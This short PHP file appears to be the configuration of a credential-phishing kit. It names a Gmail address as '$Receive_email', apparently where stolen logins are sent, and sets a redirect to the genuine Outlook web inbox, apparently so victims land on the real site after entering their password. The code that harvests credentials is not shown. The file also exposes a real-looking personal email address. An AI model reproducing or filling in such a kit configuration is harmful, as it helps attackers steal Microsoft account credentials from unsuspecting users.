<?php 
$Receive_email="johnsonblenco234@gmail.com";
$redirect="https://outlook.office.com/mail/inbox";
?>